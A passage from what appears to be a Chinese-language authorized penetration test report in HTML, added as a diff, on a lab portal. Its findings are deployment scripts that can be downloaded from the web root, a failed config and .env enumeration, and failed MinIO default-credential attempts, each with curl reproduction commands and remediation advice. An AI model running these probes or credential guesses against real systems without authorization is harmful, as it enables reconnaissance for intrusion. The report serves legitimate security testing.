+<details class="ev"><summary>证据 / 详情（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>Authorization AWS4-HMAC-SHA256 Credential=minioadmin/… → InvalidAccessKeyId；Credential=admin/… secret=lab-default|admin → SignatureDoesNotMatch；Credential=minio/… secret=lab-minio → SignatureDoesNotMatch。</span></div>
+<div class="row"><span class="k">验证细节</span><span>minioadmin=InvalidAccessKeyId；admin/minio=SignatureDoesNotMatch；同一签名实现下结论可靠。</span></div>
+<div class="row"><span class="k">证明 URL</span><span class="mono">http://10.10.20.40:9000/</span></div>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 使用下列 curl PoC 复现（按目标环境微调）：</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+</div></details>
+</div></article>
+
+<article class="vf med" id="vuln-node:vuln:optimize-assets-py-leak">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip med">中危</span><h3>optimize-assets.py 源码可直接下载（部署目录暴露）</h3></div>
+<div class="vmeta"><span>类型 vuln</span>
+<span>状态 节点级记录</span></div>
+</div><div class="vbody">
+<div class="vsec"><h4><span class="tick">概述 / 危害</span></h4>
+<p>README 中提到的未链接维护脚本 optimize-assets.py 在 web 根直接可下载（HTTP 200，6606B，last-modified 2026-08-17）——证明站点根 = 部署文件夹 portal-site/ 且未过滤非链接文件。脚本内容泄露：_originals/ 备份目录逻辑、IMG_DIRS=upload/people/media/news、视频 media/Background_viz.mp4。</p>
+<p>同批 fetch-remaining-assets.sh / fix-missing.sh / ASSETS-NEEDED.txt 已 404（部署时被删或未上传）。结论：部署不干净，根目录其他残留文件值得继续排查；upload/ 下文件可直接访问（PDF 已证实）。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick">复现要点</span></h4><pre>curl -sk -o /dev/null -w &#x27;%{http_code} %{size_download}\n&#x27; https://portal.lab.internal/optimize-assets.py</pre></div>
+<div class="vsec"><h4><span class="tick g">修复要点</span></h4>
+<p style="font-size:13.5px">部署目录清理：删除 web 根下未引用的维护脚本与备份；发布流程加入产物白名单与敏感文件扫描。</p></div>
+<details class="ev"><summary>证据 / 详情（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>web 根直接可下载 optimize-assets.py（HTTP 200，6606B，last-modified 2026-08-17）；脚本内容泄露 _originals/ 备份目录逻辑、IMG_DIRS=upload/people/media/news、视频 media/Background_viz.mp4；同批 fetch-remaining-assets.sh / fix-missing.sh / ASSETS-NEEDED.txt 均 404。</span></div>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 依据证据片段手工构造请求复现（本条未提供独立 poc_curl）。</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+<div class="row"><span class="k">节点关联</span><span>漏洞节点 vuln:optimize-assets-py-leak；与低危项「部署目录脚本源码任意下载」联动。</span></div>
+</div></details>
+</div></article>
+<!-- /SLOT:findings-medium -->
+</section>
+<section class="sec" id="low">
+<div class="sec-head"><span class="num">09</span><h2>低危漏洞（Low · 2 项）</h2><span class="en">Low Findings</span></div>
+
+<!-- SLOT:findings-low -->
+<p class="sec-sub">低危项共 2 项：部署目录脚本源码任意下载（已验证）与部署目录配置枚举穷尽（节点级记录，未发现密钥）。</p>
+<article class="vf low" id="vuln-f_829d22a32949">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip low">低危</span><h3>部署目录脚本源码任意下载（optimize-assets.py，未授权文件读）</h3></div>
+<div class="vmeta"><span>类型 info_disclosure</span>
+<span>状态 <b style="color:var(--ok)">已验证</b></span></div>
+</div><div class="vbody">
+<div class="vsec"><h4><span class="tick">概述 / 危害</span></h4>
+<p>站点站根（portal-site 部署文件夹）未防护：/optimize-assets.py 可被直接 HTTP 取回（200, 6606 字节, application/octet-stream）。该文件是 README.md 泄露清单中的资产优化脚本，部署后未删除。源码泄露部署目录结构、_originals/ 备份机制、素材目录 upload/people/media/news、视频文件与依赖（Pillow/ffmpeg）等内部细节。</p>
+<p>证明：凡 README/JS 泄露过文件名的 webroot 内文件均可任意取回（.git/.bak 被 WAF 拦，但 .py 不在拦截规则内）。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick">复现要点</span></h4><pre>curl -sk -o /dev/null -w &#x27;%{http_code} %{size_download}\n&#x27; https://portal.lab.internal/optimize-assets.py &amp;&amp; curl -sk https://portal.lab.internal/optimize-assets.py | head -5</pre></div>
+<div class="vsec"><h4><span class="tick g">修复要点</span></h4>
+<p style="font-size:13.5px">删除 web 根下部署残留脚本与备份；发布流程禁止非站点产物落入 web 根；WAF 规则补充 .py 等源码后缀拦截。</p></div>
+<details class="ev"><summary>证据 / 详情（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>GET https://portal.lab.internal/optimize-assets.py → HTTP 200, server: Server, content-type: application/octet-stream, content-length: 6606, last-modified: Mon, 17 Aug 2026 05:29:04 GMT；响应体以 Python 源码头 "# -*- coding: utf-8 -*-" 与 "optimize-assets.py — 资产优化 · asset optimizer for the portal-site" 开头，含 BACKUP 目录 _originals、图片目录列表 [upload, people, media/news] 等部署细节。对照：同清单其他文件（fetch-remaining-assets.sh/fix-missing.sh/ASSETS-NEEDED.txt/portal-site.zip/_originals/）均 404，唯 .py 未删未拦。</span></div>
+<div class="row"><span class="k">证明 URL</span><span class="mono">https://portal.lab.internal/optimize-assets.py</span></div>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 使用下列 curl PoC 复现（按目标环境微调）：</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+</div></details>
+</div></article>
+
+<article class="vf low" id="vuln-node:vuln:deploy-dir-config-enum">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip low">低危</span><h3>部署目录配置枚举穷尽：零密钥命中（read_to_creds 关闭）</h3></div>
+<div class="vmeta"><span>类型 vuln</span>
+<span>状态 节点级记录</span></div>
+</div><div class="vbody">
+<div class="vsec"><h4><span class="tick">概述 / 危害</span></h4>
+<p>对部署目录做配置枚举穷尽（40 候选，含 Chrome UA 换发 TLS 指纹复核）：python 配置族（config/settings/app/main/manage/wsgi/db 等 9 个）、依赖清单、部署脚本、robots/sitemap、站点 zip 全 404；dot-env 族 8 变体 404（黑洞否证，WAF 无保护面）；sql/备份后缀/conf 关键词在 WAF 规则内（729B 拦截）；备份目录深路径 2 次连接挂起后停止。</p>
+<p>补充命中：rename-spaced-files.sh 可下载（429B，泄露 upload/new/ 旧站素材文件名）。写验证：OPTIONS→405、PUT→404，纯 CLI 脚本无可 Web 触发写分支，静态站不可写；登录面 admin/api/login 全 404；autoindex 矩阵全 403。结论：无密钥/DSN/凭据/会话，配置读取链路穷尽关闭，未发现可落地的密钥类风险。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick">复现要点</span></h4><pre># 候选枚举均 404；rename-spaced-files.sh → 200（429B，泄露 upload/new/ 旧站素材文件名）
+curl -sk -o /dev/null -w &#x27;%{http_code} %{size_download}\n&#x27; https://portal.lab.internal/rename-spaced-files.sh</pre></div>
+<div class="vsec"><h4><span class="tick g">修复要点</span></h4>
+<p style="font-size:13.5px">清理 web 根残留的维护脚本（rename-spaced-files.sh 等）；部署产物白名单化，杜绝配置 / 密钥文件落入站根。</p></div>
+<details class="ev"><summary>证据 / 详情（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>配置枚举 40 候选穷尽：python 配置族（config/settings/app/main/manage/wsgi/db 等 9 个）、依赖清单、部署脚本、robots/sitemap、站点 zip 全 404；dot-env 族 8 变体 404；sql/备份后缀/conf 关键词在 WAF 规则内（729B 拦截）；命中补充：rename-spaced-files.sh 可下载（429B，泄露 upload/new/ 旧站素材文件名）；写验证 OPTIONS→405、PUT→404；登录面 admin/api/login 全 404；autoindex 矩阵全 403。</span></div>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 依据证据片段手工构造请求复现（本条未提供独立 poc_curl）。</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+<div class="row"><span class="k">节点关联</span><span>漏洞节点 vuln:deploy-dir-config-enum；结论为配置读取链路关闭，无密钥 / DSN / 凭据命中。</span></div>
+</div></details>
+</div></article>
+<!-- /SLOT:findings-low -->
+</section>
+<!-- SLOT:footer -->
+<footer>
+<span>授权渗透测试交付报告 · 内网靶场 · 示例环境（portal.lab.internal）</span>
+<span>数据来源：授权测试取证记录 · 2026-08-31</span>
+</footer>
+<!-- /SLOT:footer -->
+
+</main>
+</body></html>
